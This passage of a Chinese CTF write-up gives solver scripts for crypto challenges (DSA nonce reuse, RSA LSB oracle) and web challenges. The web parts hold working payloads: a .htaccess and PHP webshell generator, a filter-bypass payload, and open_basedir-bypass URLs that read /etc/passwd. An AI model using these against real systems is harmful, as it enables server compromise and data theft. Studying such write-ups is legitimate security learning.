<span class="n">dm</span><span class="o">=</span><span class="n">m1</span><span class="o">-</span><span class="n">m0</span>
<span class="n">ds</span><span class="o">=</span><span class="n">s1</span><span class="o">-</span><span class="n">s0</span>

<span class="n">k</span> <span class="o">=</span> <span class="n">gmpy2</span><span class="o">.</span><span class="n">mul</span><span class="p">(</span><span class="n">dm</span><span class="p">,</span> <span class="n">gmpy2</span><span class="o">.</span><span class="n">invert</span><span class="p">(</span><span class="n">ds</span><span class="p">,</span> <span class="n">q</span><span class="p">))</span>
<span class="n">k</span> <span class="o">=</span> <span class="n">gmpy2</span><span class="o">.</span><span class="n">f_mod</span><span class="p">(</span><span class="n">k</span><span class="p">,</span> <span class="n">q</span><span class="p">)</span>
<span class="n">tmp</span> <span class="o">=</span> <span class="n">gmpy2</span><span class="o">.</span><span class="n">mul</span><span class="p">(</span><span class="n">k</span><span class="p">,</span> <span class="n">s0</span><span class="p">)</span> <span class="o">-</span> <span class="n">m0</span>
<span class="n">x</span> <span class="o">=</span> <span class="n">tmp</span> <span class="o">*</span> <span class="n">gmpy2</span><span class="o">.</span><span class="n">invert</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="n">q</span><span class="p">)</span>
<span class="n">x</span> <span class="o">=</span> <span class="n">gmpy2</span><span class="o">.</span><span class="n">f_mod</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="n">q</span><span class="p">)</span>

<span class="n">data5</span><span class="o">=</span><span class="s2">"""And nothing 'gainst Time's scythe can make defence"""</span>

<span class="n">kinv</span> <span class="o">=</span> <span class="n">_modinv</span><span class="p">(</span><span class="n">k</span><span class="p">,</span> <span class="n">q</span><span class="p">)</span>
<span class="n">h</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">md5</span><span class="p">(</span><span class="n">data5</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span><span class="o">.</span><span class="n">digest</span><span class="p">()</span>
<span class="n">h</span> <span class="o">=</span> <span class="nb">int</span><span class="o">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">h</span><span class="p">,</span> <span class="s2">"big"</span><span class="p">)</span>
<span class="n">s</span> <span class="o">=</span> <span class="n">kinv</span> <span class="o">*</span> <span class="p">(</span><span class="n">h</span> <span class="o">+</span> <span class="n">r</span> <span class="o">*</span> <span class="n">x</span><span class="p">)</span> <span class="o">%</span> <span class="n">q</span>
<span class="k">print</span><span class="p">(</span><span class="s2">"("</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">r</span><span class="p">)</span><span class="o">+</span><span class="s2">"L, "</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">s</span><span class="p">))</span><span class="o">+</span><span class="s2">"L)"</span><span class="p">)</span>
<span class="c1">#flag：flag{Wh4t_a_Prety_Si3nature!}</span>
</pre></div>
<h2 data-content="1" id="e7c9560d98cf73720cbbee37e54b8bb8">mt</h2>
<p>出题人加密很直观，明文不断的加密，最终的还是明文，所以直奔主题，payload如下：</p>
<div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">Crypto.Random</span> <span class="kn">import</span> <span class="n">random</span>
<span class="kn">from</span> <span class="nn">Crypto.Util</span> <span class="kn">import</span> <span class="n">number</span>

<span class="k">def</span> <span class="nf">convert</span><span class="p">(</span><span class="n">m</span><span class="p">):</span>
    <span class="n">m</span> <span class="o">=</span> <span class="n">m</span> <span class="o">^</span> <span class="n">m</span> <span class="o">&gt;&gt;</span> <span class="mi">13</span>
    <span class="n">m</span> <span class="o">=</span> <span class="n">m</span> <span class="o">^</span> <span class="n">m</span> <span class="o">&lt;&lt;</span> <span class="mi">9</span> <span class="o">&amp;</span> <span class="mi">2029229568</span>
    <span class="n">m</span> <span class="o">=</span> <span class="n">m</span> <span class="o">^</span> <span class="n">m</span> <span class="o">&lt;&lt;</span> <span class="mi">17</span> <span class="o">&amp;</span> <span class="mi">2245263360</span>
    <span class="n">m</span> <span class="o">=</span> <span class="n">m</span> <span class="o">^</span> <span class="n">m</span> <span class="o">&gt;&gt;</span> <span class="mi">19</span>
    <span class="k">return</span> <span class="n">m</span>

<span class="k">def</span> <span class="nf">transform</span><span class="p">(</span><span class="n">message</span><span class="p">):</span>
    <span class="n">new_message</span> <span class="o">=</span> <span class="s1">''</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">message</span><span class="p">)</span> <span class="o">/</span> <span class="mi">4</span><span class="p">):</span>
        <span class="n">block</span> <span class="o">=</span> <span class="n">message</span><span class="p">[</span><span class="n">i</span> <span class="o">*</span> <span class="mi">4</span> <span class="p">:</span> <span class="n">i</span> <span class="o">*</span> <span class="mi">4</span> <span class="o">+</span><span class="mi">4</span><span class="p">]</span>
        <span class="n">block</span> <span class="o">=</span> <span class="n">number</span><span class="o">.</span><span class="n">bytes_to_long</span><span class="p">(</span><span class="n">block</span><span class="p">)</span>
        <span class="n">block</span> <span class="o">=</span> <span class="n">convert</span><span class="p">(</span><span class="n">block</span><span class="p">)</span>
        <span class="n">block</span> <span class="o">=</span> <span class="n">number</span><span class="o">.</span><span class="n">long_to_bytes</span><span class="p">(</span><span class="n">block</span><span class="p">,</span> <span class="mi">4</span><span class="p">)</span>
        <span class="n">new_message</span> <span class="o">+=</span> <span class="n">block</span>
    <span class="k">return</span> <span class="n">new_message</span>
<span class="n">c1</span> <span class="o">=</span> <span class="s1">'641460a9'</span>
<span class="n">c2</span> <span class="o">=</span> <span class="s1">'e3953b1a'</span>
<span class="n">c3</span> <span class="o">=</span> <span class="s1">'aa21f3a2'</span>
<span class="k">def</span> <span class="nf">decode</span><span class="p">(</span><span class="n">c</span><span class="p">):</span>
 <span class="n">x</span> <span class="o">=</span> <span class="n">c</span>
 <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
     <span class="n">xx</span> <span class="o">=</span> <span class="n">x</span>
     <span class="n">x</span> <span class="o">=</span> <span class="n">transform</span><span class="p">(</span><span class="n">x</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">'hex'</span><span class="p">))</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">'hex'</span><span class="p">)</span>
     <span class="k">if</span> <span class="n">x</span> <span class="o">==</span> <span class="n">c</span><span class="p">:</span>
         <span class="k">return</span> <span class="n">xx</span>

<span class="k">print</span><span class="p">(</span><span class="n">decode</span><span class="p">(</span><span class="n">c1</span><span class="p">)</span><span class="o">+</span><span class="n">decode</span><span class="p">(</span><span class="n">c2</span><span class="p">)</span><span class="o">+</span><span class="n">decode</span><span class="p">(</span><span class="n">c3</span><span class="p">))</span>
<span class="c1">#flag{84b45f89af22ce7e67275bdc}</span>
</pre></div>
<h2 data-content="1" id="03d8a74df30e9d4e35872ab4a2981dd3">RSA</h2>
<p>lsb Oracal attack</p>
<div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="nn">hashlib</span> <span class="kn">import</span> <span class="n">md5</span>
<span class="kn">import</span> <span class="nn">decimal</span>
<span class="n">a</span> <span class="o">=</span> <span class="mi">0</span>
<span class="k">def</span> <span class="nf">oracle</span><span class="p">(</span><span class="n">num</span><span class="p">):</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">"Please input your option:"</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">"D"</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">"Your encrypted message:"</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">num</span><span class="p">))</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">"The plain of your decrypted message is "</span><span class="p">)</span>
    <span class="n">lsb</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">lsb</span> <span class="o">==</span> <span class="s1">'odd'</span>

<span class="k">def</span> <span class="nf">partial</span><span class="p">(</span><span class="n">c</span><span class="p">,</span><span class="n">e</span><span class="p">,</span><span class="n">n</span><span class="p">):</span>
    <span class="n">k</span> <span class="o">=</span> <span class="n">n</span><span class="o">.</span><span class="n">bit_length</span><span class="p">()</span>
    <span class="n">decimal</span><span class="o">.</span><span class="n">getcontext</span><span class="p">()</span><span class="o">.</span><span class="n">prec</span> <span class="o">=</span> <span class="n">k</span>  <span class="c1"># for 'precise enough' floats</span>
    <span class="n">lo</span> <span class="o">=</span> <span class="n">decimal</span><span class="o">.</span><span class="n">Decimal</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
    <span class="n">hi</span> <span class="o">=</span> <span class="n">decimal</span><span class="o">.</span><span class="n">Decimal</span><span class="p">(</span><span class="n">n</span><span class="p">)</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">k</span><span class="p">):</span>
        <span class="k">if</span> <span class="ow">not</span> <span class="n">oracle</span><span class="p">(</span><span class="n">c</span><span class="p">):</span>
            <span class="n">hi</span> <span class="o">=</span> <span class="p">(</span><span class="n">lo</span> <span class="o">+</span> <span class="n">hi</span><span class="p">)</span> <span class="o">/</span> <span class="mi">2</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="n">lo</span> <span class="o">=</span> <span class="p">(</span><span class="n">lo</span> <span class="o">+</span> <span class="n">hi</span><span class="p">)</span> <span class="o">/</span> <span class="mi">2</span>
        <span class="n">c</span> <span class="o">=</span> <span class="p">(</span><span class="n">c</span> <span class="o">*</span> <span class="nb">pow</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="n">e</span><span class="p">,</span> <span class="n">n</span><span class="p">))</span> <span class="o">%</span> <span class="n">n</span>
        <span class="k">print</span> <span class="n">i</span><span class="p">,</span> <span class="nb">int</span><span class="p">(</span><span class="n">hi</span> <span class="o">-</span> <span class="n">lo</span><span class="p">)</span>
    <span class="k">return</span> <span class="nb">int</span><span class="p">(</span><span class="n">hi</span><span class="p">)</span>

<span class="n">s</span> <span class="o">=</span> <span class="s2">"0123456789abcdefABCDEF"</span>
<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">"47.111.59.243"</span><span class="p">,</span><span class="s2">"9421"</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">"[*] Please find a string that md5(str + "</span><span class="p">)</span>
<span class="n">salt</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">"[0:5] == "</span><span class="p">)</span>
<span class="n">part_hash</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
<span class="n">found</span> <span class="o">=</span> <span class="mi">0</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">s</span><span class="p">:</span>
    <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="n">s</span><span class="p">:</span>
        <span class="k">for</span> <span class="n">k</span> <span class="ow">in</span> <span class="n">s</span><span class="p">:</span>
            <span class="k">for</span> <span class="n">l</span> <span class="ow">in</span> <span class="n">s</span><span class="p">:</span>
                <span class="k">for</span> <span class="n">m</span> <span class="ow">in</span> <span class="n">s</span><span class="p">:</span>
                    <span class="n">ss</span> <span class="o">=</span> <span class="n">i</span><span class="o">+</span><span class="n">j</span><span class="o">+</span><span class="n">k</span><span class="o">+</span><span class="n">l</span><span class="o">+</span><span class="n">m</span>
                    <span class="k">if</span> <span class="n">md5</span><span class="p">(</span><span class="n">ss</span><span class="o">+</span><span class="n">salt</span><span class="p">)</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()[:</span><span class="mi">5</span><span class="p">]</span> <span class="o">==</span> <span class="n">part_hash</span><span class="p">:</span>
                        <span class="n">found</span> <span class="o">=</span> <span class="mi">1</span>
                        <span class="k">break</span>
                <span class="k">if</span> <span class="n">found</span><span class="p">:</span>
                    <span class="k">break</span>
            <span class="k">if</span> <span class="n">found</span><span class="p">:</span>
                <span class="k">break</span>
        <span class="k">if</span> <span class="n">found</span><span class="p">:</span>
            <span class="k">break</span>
    <span class="k">if</span> <span class="n">found</span><span class="p">:</span>
        <span class="k">break</span>

<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">"&gt; "</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">ss</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">"Guess the Secrets 3 times, Then you will get the flag!</span><span class="se">\n</span><span class="s2">"</span><span class="p">)</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">3</span><span class="p">):</span>
    <span class="n">R</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">"n = "</span><span class="p">)</span>
    <span class="n">n</span> <span class="o">=</span> <span class="nb">eval</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">())</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">"e = "</span><span class="p">)</span>
    <span class="n">e</span> <span class="o">=</span> <span class="nb">eval</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">())</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">"The Encypted secret:"</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">"c = "</span><span class="p">)</span>
    <span class="n">c</span> <span class="o">=</span> <span class="nb">eval</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">())</span>
    <span class="n">c_of_2</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="n">e</span><span class="p">,</span><span class="n">n</span><span class="p">)</span>
    <span class="n">m</span> <span class="o">=</span> <span class="n">partial</span><span class="p">((</span><span class="n">c</span><span class="o">*</span><span class="n">c_of_2</span><span class="p">)</span><span class="o">%</span><span class="n">n</span><span class="p">,</span><span class="n">e</span><span class="p">,</span><span class="n">n</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">"Please input your option:"</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">"G"</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">'The secret:'</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">m</span><span class="p">))</span>
    <span class="n">s</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
    <span class="k">print</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
    <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="n">s</span><span class="o">+</span><span class="s1">' '</span><span class="o">+</span><span class="n">R</span><span class="o">+</span><span class="s2">" success!"</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</pre></div>
<h1 data-content="1" id="8964cf3b19dd83cf58c8fe29114d0857">web</h1>
<h2 data-content="1" id="029f4f6783929cdf77316381b06776d3">CheckIn</h2>
<p>题目功能是一个文件上传，可以上传jpg、png等文件，但是限制了php，而且还判断了上传的文件头，使用exif_image来判断的，这个很容易绕过，直接随便加一个图片文件头就行，并且上传之后会给出文件所在目录</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190819145315-04ce33a8-c24e-1.png"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190819145317-05d44cb0-c24e-1.png"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190819145322-09089396-c24e-1.png"/></p>
<p>尝试了.htaccess，发现不行，队里师傅突然说用<code>.user.ini</code>orz，第一次见还能这么做。先发下p牛的链接</p>
<p><a href="https://wooyun.js.org/drops/user.ini文件构成的PHP后门.html" target="_blank">.user.ini文件构成的PHP后门</a></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190819145324-0a3d8f64-c24e-1.png"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190819145326-0b2e9526-c24e-1.png"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190819145330-0da74370-c24e-1.png"/></p>
<h2 data-content="1" id="b4950090326ee3bcea3684e64d13acf6">EasyPHP</h2>
<p><a href="https://blog.zeddyu.info/2019/07/20/isitdtu-2019/" target="_blank">ISITDTU CTF 2019 EasyPHP 回顾</a></p>
<p>找到一篇类似的题，但是这里长度限制了18，太狠了，还过滤了字母数字。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190819145339-13215b10-c24e-1.png"/></p>
<p>于是谷歌了一番，找到了Smi1e师傅的一篇<a href="https://www.smi1e.top/php不使用数字字母和下划线写shell/" target="_blank">文章</a>，结合陆队的blog，找到了思路</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190819145332-0f31b284-c24e-1.png"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190819145337-11c75a26-c24e-1.png"/></p>
<p>经过摸索，找到payload</p>
<p><code>${%A0%B8%BA%AB^%ff%ff%ff%ff}{%A0}();&amp;%A0=get_the_flag</code></p>
<p>接下来就是上传了，说一下流程，上传一个.htaccess，然后getshell，直接贴脚本了</p>
<div class="highlight"><pre><span></span><span class="n">SIZE_HEADER</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\n\n</span><span class="s2">#define width 1337</span><span class="se">\n</span><span class="s2">#define height 1337</span><span class="se">\n\n</span><span class="s2">"</span>

<span class="k">def</span> <span class="nf">generate_php_file</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="n">script</span><span class="p">):</span>
    <span class="n">phpfile</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="s1">'wb'</span><span class="p">)</span>

    <span class="n">phpfile</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">script</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">'utf-16be'</span><span class="p">))</span>
    <span class="n">phpfile</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">SIZE_HEADER</span><span class="p">)</span>

    <span class="n">phpfile</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>

<span class="k">def</span> <span class="nf">generate_htacess</span><span class="p">():</span>
    <span class="n">htaccess</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s1">'.htaccess'</span><span class="p">,</span> <span class="s1">'wb'</span><span class="p">)</span>

    <span class="n">htaccess</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">SIZE_HEADER</span><span class="p">)</span>
    <span class="n">htaccess</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="sa">b</span><span class="s1">'AddType application/x-httpd-php .south</span><span class="se">\n</span><span class="s1">'</span><span class="p">)</span>
    <span class="n">htaccess</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="sa">b</span><span class="s1">'php_value zend.multibyte 1</span><span class="se">\n</span><span class="s1">'</span><span class="p">)</span>
    <span class="n">htaccess</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="sa">b</span><span class="s1">'php_value zend.detect_unicode 1</span><span class="se">\n</span><span class="s1">'</span><span class="p">)</span>
    <span class="n">htaccess</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="sa">b</span><span class="s1">'php_value display_errors 1</span><span class="se">\n</span><span class="s1">'</span><span class="p">)</span>

    <span class="n">htaccess</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>

<span class="n">generate_htacess</span><span class="p">()</span>
<span class="n">generate_php_file</span><span class="p">(</span><span class="s2">"webshell.south"</span><span class="p">,</span> <span class="s2">"&lt;?php eval($_GET['cmd']); die(); ?&gt;"</span><span class="p">)</span>
</pre></div>
<p>把文件上传上去之后得到shell，发现有<code>open_basedir</code>，这里想到0CTF-TCTF final的绕过<code>open_basedir</code>任意文件读取</p>
<p><code>http://47.111.59.243:9001/upload/tmp_cc54f9a65160d1015e9d4b96601f1274/webshell.south?cmd=mkdir("/tmp/fuck");chdir('/tmp/fuck/');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');var_dump(file_get_contents("/etc/passwd"));</code></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190819145346-1716da7e-c24e-1.png"/></p>
<p><code>http://47.111.59.243:9001/upload/tmp_cc54f9a65160d1015e9d4b96601f1274/webshell.south?cmd=mkdir("/tmp/fuck");chdir('/tmp/fuck/');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');var_dump(scandir("/"));</code></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190819145346-177d14e2-c24e-1.png"/></p>
<p><code>http://47.111.59.243:9001/upload/tmp_cc54f9a65160d1015e9d4b96601f1274/webshell.south?cmd=mkdir("/tmp/fuck");chdir('/tmp/fuck/');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');readfile("/THis_Is_tHe_F14g"));</code></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190819145348-186f5a22-c24e-1.png"/></p>
<h2 data-content="1" id="6a2f788431cc9d079d0b815e37dbff13">Upload labs 2</h2>
<p>这道题开放了不久，给了源码，接着审计一波,index.php上传这里没啥限制，限制了文件后缀</p>
<div class="highlight"><pre><span></span><span class="x">#index.php</span>
<span class="cp">&lt;?php</span>
<span class="k">include</span> <span class="s1">'class.php'</span><span class="p">;</span>

<span class="nv">$userdir</span> <span class="o">=</span> <span class="s2">"upload/"</span> <span class="o">.</span> <span class="nb">md5</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">"REMOTE_ADDR"</span><span class="p">]);</span>
<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">file_exists</span><span class="p">(</span><span class="nv">$userdir</span><span class="p">))</span> <span class="p">{</span>
    <span class="nb">mkdir</span><span class="p">(</span><span class="nv">$userdir</span><span class="p">,</span> <span class="mo">0777</span><span class="p">,</span> <span class="k">true</span><span class="p">);</span>
<span class="p">}</span>
<span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">"upload"</span><span class="p">]))</span> <span class="p">{</span>
    <span class="c1">// 允许上传的图片后缀</span>
    <span class="nv">$allowedExts</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">"gif"</span><span class="p">,</span> <span class="s2">"jpeg"</span><span class="p">,</span> <span class="s2">"jpg"</span><span class="p">,</span> <span class="s2">"png"</span><span class="p">);</span>
    <span class="nv">$tmp_name</span> <span class="o">=</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s2">"file"</span><span class="p">][</span><span class="s2">"tmp_name"</span><span class="p">];</span>
    <span class="nv">$file_name</span> <span class="o">=</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s2">"file"</span><span class="p">][</span><span class="s2">"name"</span><span class="p">];</span>
    <span class="nv">$temp</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">"."</span><span class="p">,</span> <span class="nv">$file_name</span><span class="p">);</span>
    <span class="nv">$extension</span> <span class="o">=</span> <span class="nb">end</span><span class="p">(</span><span class="nv">$temp</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(((</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">"file"</span><span class="p">][</span><span class="s2">"type"</span><span class="p">]</span> <span class="o">==</span> <span class="s2">"image/gif"</span><span class="p">)</span>
            <span class="o">||</span> <span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">"file"</span><span class="p">][</span><span class="s2">"type"</span><span class="p">]</span> <span class="o">==</span> <span class="s2">"image/jpeg"</span><span class="p">)</span>
            <span class="o">||</span> <span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">"file"</span><span class="p">][</span><span class="s2">"type"</span><span class="p">]</span> <span class="o">==</span> <span class="s2">"image/png"</span><span class="p">))</span>
        <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">"file"</span><span class="p">][</span><span class="s2">"size"</span><span class="p">]</span> <span class="o">&lt;</span> <span class="mi">204800</span><span class="p">)</span>   <span class="c1">// 小于 200 kb</span>
        <span class="o">&amp;&amp;</span> <span class="nb">in_array</span><span class="p">(</span><span class="nv">$extension</span><span class="p">,</span> <span class="nv">$allowedExts</span><span class="p">)</span>
    <span class="p">)</span> <span class="p">{</span>
        <span class="nv">$c</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Check</span><span class="p">(</span><span class="nv">$tmp_name</span><span class="p">);</span>
        <span class="nv">$c</span><span class="o">-&gt;</span><span class="na">check</span><span class="p">();</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s2">"file"</span><span class="p">][</span><span class="s2">"error"</span><span class="p">]</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">echo</span> <span class="s2">"错误：: "</span> <span class="o">.</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s2">"file"</span><span class="p">][</span><span class="s2">"error"</span><span class="p">]</span> <span class="o">.</span> <span class="s2">"&lt;br&gt;"</span><span class="p">;</span>
            <span class="k">die</span><span class="p">();</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="nb">move_uploaded_file</span><span class="p">(</span><span class="nv">$tmp_name</span><span class="p">,</span> <span class="nv">$userdir</span> <span class="o">.</span> <span class="s2">"/"</span> <span class="o">.</span> <span class="nb">md5</span><span class="p">(</span><span class="nv">$file_name</span><span class="p">)</span> <span class="o">.</span> <span class="s2">"."</span> <span class="o">.</span> <span class="nv">$extension</span><span class="p">);</span>
            <span class="k">echo</span> <span class="s2">"文件存储在: "</span> <span class="o">.</span> <span class="nv">$userdir</span> <span class="o">.</span> <span class="s2">"/"</span> <span class="o">.</span> <span class="nb">md5</span><span class="p">(</span><span class="nv">$file_name</span><span class="p">)</span> <span class="o">.</span> <span class="s2">"."</span> <span class="o">.</span> <span class="nv">$extension</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="k">echo</span> <span class="s2">"非法的文件格式"</span><span class="p">;</span>
    <span class="p">}</span>   
<span class="p">}</span>
</pre></div>
<p>func.php接受一个url参数，参数经过一个很狠的正则，会去你上传的目录找你上传的文件，获取MIME返回。</p>
<div class="highlight"><pre><span></span><span class="x"># func.php</span>
<span class="x">if (isset($_POST["submit"]) &amp;&amp; isset($_POST["url"])) {</span>
<span class="x">    if(preg_match('/^(ftp|zlib|data|glob|phar|ssh2|compress.bzip2|compress.zlib|rar|ogg|expect)(.|\\s)*|(.|\\s)*(file|data|\.\.)(.|\\s)*/i',$_POST['url'])){</span>
<span class="x">        die("Go away!");</span>
<span class="x">    }else{</span>
<span class="x">        $file_path = $_POST['url'];</span>
<span class="x">        $file = new File($file_path);</span>
<span class="x">        $file-&gt;getMIME();</span>
<span class="x">        echo "&lt;p&gt;Your file type is '$file' &lt;/p&gt;";</span>
<span class="x">    }</span>
<span class="x">}</span>
</pre></div>
<p>class.php这里的File的__wakeup函数很异常，预计就是题目考点了，作用是创建一个类的新实例，给出的参数将传递到类的构造函数。</p>
<div class="highlight"><pre><span></span><span class="x">#class.php</span>
<span class="cp">&lt;?php</span>
<span class="k">include</span> <span class="s1">'config.php'</span><span class="p">;</span>

<span class="k">class</span> <span class="nc">File</span><span class="p">{</span>

    <span class="k">public</span> <span class="nv">$file_name</span><span class="p">;</span>
    <span class="k">public</span> <span class="nv">$type</span><span class="p">;</span>
    <span class="k">public</span> <span class="nv">$func</span> <span class="o">=</span> <span class="s2">"Check"</span><span class="p">;</span>

    <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$file_name</span><span class="p">){</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">file_name</span> <span class="o">=</span> <span class="nv">$file_name</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">function</span> <span class="fm">__wakeup</span><span class="p">(){</span>
